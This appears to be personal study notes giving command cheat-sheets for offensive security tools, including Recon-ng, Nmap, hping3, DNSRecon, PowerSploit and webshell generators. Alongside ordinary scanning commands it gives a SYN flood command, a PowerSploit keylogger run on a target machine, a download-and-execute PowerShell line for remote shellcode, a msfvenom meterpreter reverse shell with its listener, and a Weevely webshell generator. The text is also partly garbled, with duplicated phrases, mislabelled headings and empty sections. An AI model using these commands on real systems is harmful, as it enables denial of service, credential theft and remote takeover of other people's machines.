## 25030814# 25030814
2026/2/14
## 1.Recon-ng
>Due to the fact that Due to the fact that **Rrcon-ng V5** does not come with built-in modules, all functions need to be downloaded from the  does not come with built-in modules, all functions need to be downloaded from the **marketplace**..

```
marketplace install all
```
<img img width=="551" height=="95" alt=="image" src=="https://github.com/user-attachments/assets/39a0fb1d-0cfd-4447-8539-5fccac76f85a" />

### 1.1 Collect subdomains
```
modules search bing
```
<img img width=="490" height=="163" alt=="image" src=="https://github.com/user-attachments/assets/d02bf7e4-c091-4470-86bf-660e126d9ad9" />

```
module load <Module Name>
```
```
option set SOURCE example.com
```
```
run
```
<img img width=="628" height=="144" alt=="image" src=="https://github.com/user-attachments/assets/51c9c1bc-cff6-48d7-a998-4fff59511260" />

### 1.2 certificate_transparency
```
module load recon/domains-hosts/certificate_transparency
```
```
option set SOURCE example.com
```
```
run
```

<img img img width=="661" height=="126" alt=="image" src=="https://github.com/user-attachments/assets/5cfebfd8-216f-4cf2-9e14-b3b60b9e2f93" />

### 1.3 DNS resolution
```
module load recon/hosts-hosts/resolve
```
```
run
```
<img width="524" height="35" alt="image" src="https://github.com/user-attachments/assets/e4155220-4ab5-460c-8cab-a9668e34fc76" />

- [渗透测试RECON-NG介绍](https://blog.csdn.net/weixin_42952508/article/details/124443273)

## 2 Nmap
### 2.1 Host alive scan
```
nmap -sn 192.168.1.0/24
```
<img width="568" height="364" alt="image" src="https://github.com/user-attachments/assets/be9a152b-60c7-4cc0-8763-22ebbe4d8f02" />

### 2.2 Common port scanning
```
nmap -sS -p 1-1000 <IP>
```
<img width="518" height="213" alt="image" src="https://github.com/user-attachments/assets/f9d34dd3-99a1-498a-974b-6b63d3eb343e" />

### 2.3 Service version and system identification scanning
```
nmap -sV -O <IP>
```
<img width="1075" height="371" alt="image" src="https://github.com/user-attachments/assets/be96decc-17de-48ed-afab-bc586d67ee8a" />

- [Nmap完整使用教程](https://blog.csdn.net/wrjhs/article/details/147080972)

## 3 Hping3
### 3.1 Customize ICMP Ping Scan
```
sudo hping3 -1 -c 5 -d 100 <IP>    //Specify ICMP protocol to send 5 packets of 100kb size
```

### 3.2 TCP port scanning
```
sudo hping3 -S -p 80 -c 10 <IP>        //Scan port 80
```
<img width="628" height="121" alt="image" src="https://github.com/user-attachments/assets/f86631d6-ef83-40ff-a788-9e36e0b50be5" />

### 3.3 SYN flood attack
```
sudo hping3 -S -p 80 --flood <IP>      //
```
<img width="623" height="96" alt="image" src="https://github.com/user-attachments/assets/68b35999-021e-42de-8f34-ebda382cd602" />

- [hping3全参数详细教程](https://blog.csdn.net/qq_24305079/article/details/144963291)

## 4 DNSRecon
### 4.1 subdomain enumeration
```
sudo dnsrecon -d example.com -D /usr/share/dnsrecon/namelist.txt -t brt
```
<img width="689" height="211" alt="image" src="https://github.com/user-attachments/assets/a58340e7-7875-4c23-8343-0126d863b638" />

### 4.2 -b
```
dnsrecon -d baidu.com -b      //Perform Bing enumeration using standard enumeration.
```
<img width="501" height="152" alt="image" src="https://github.com/user-attachments/assets/01138a9a-f9fc-4012-bd1a-e5804e294b6a" />

### 4.3 -y 
```
dnsrecon -d baidu.com -y      //Execute Yandex enumeration using standard enumeration
```
<img width="496" height="129" alt="image" src="https://github.com/user-attachments/assets/9de6f78c-b7dd-45cc-965c-9e47509adddd" />

- [Dnsrecon全参数详细教程](https://www.bilibili.com/read/cv40056693/?opus_fallback=1)


### 5 Powersploit
## 5.1 Invoke-Portscan
>The command needs to be executed in **PowerShell**.
```
. ./Invoke-Portscan.ps1       //Load module
```
```
Invoke-Portscan -Hosts 127.0.0.1  
```
<img width="675" height="410" alt="image" src="https://github.com/user-attachments/assets/ec37fe76-7cd7-4fb7-b8f9-203a1b5b753c" />

## 5.2 Get-Keystrokes
```
. ./Get-Keystrokes.ps1    //Load module
```

```
Get-Keystrokes -LogPath C:\temp\keylog.txt    //The target machine executes the operation and records it in keylog.txt
```
<img width="714" height="567" alt="image" src="https://github.com/user-attachments/assets/8c3c4fbe-7dd9-4802-91bb-7fac302e8f6b" />

- [Powersploit的安装及脚本攻击实战](https://www.cnblogs.com/zhengna/p/12186118.html)

## 5.3 Get-NetDomain
```
IEX (New-Object Net.WebClient).DownloadString("http://IP/Invoke-Shellcode.ps1")    //Remote script loading
```
```
msfvenom -p windows/meterpreter/reverse_tcp \LHOST=IP \LPORT=443 \-f powershell \-o shellcode.ps1    //Create a shell script
```
```
msfconsole -q    //start msfconsole
use exploit/multi/handler  //Load multiprocessing module
//Configure loads and parameters consistent with Shellcode
set payload windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT 443
//Enable listening (continuously waiting for the session)
run
```
<img width="828" height="279" alt="image" src="https://github.com/user-attachments/assets/d20cdb51-b512-4f97-b7ed-ac99e588fe6d" />

### 6 Webshells
## 6.1 Behinder
> Github：https://github.com/rebeyond/Behinder
> Ice Scorpion "is a dynamic binary encryption website management client, which emerged due to the increasing number of webshells based on traffic encryption.
The main functions are: basic information, command execution, virtual terminal, file management, Socks proxy, bounce shell, database management, custom code, etc. The functions are very powerful.
<img width="1820" height="954" alt="image" src="https://github.com/user-attachments/assets/f10ea8d2-588a-489b-a00b-07cb6a10eb57" />

### 7 Weevely
<img width="651" height="243" alt="image" src="https://github.com/user-attachments/assets/ebd16283-c5fa-43dc-b4c7-9b7fdcd31ec8" />

```
weevely generate <pd> <fn>  //Generate a shell with password 'pd' and file name 'fn'
```
<img width="1023" height="168" alt="image" src="https://github.com/user-attachments/assets/31e9f47b-6b3c-432b-9fe1-294ed9df4a1d" />

- [【学习分享】kali下的weevely小工具的使用](https://www.bilibili.com/video/BV1VE411P7KC/?spm_id_from=..search-card.all.click&vd_source=89914d17e8560abebdbcebba80dbc8ee)
- 
### 8 Dns2tcp
### 9 Cryptcat
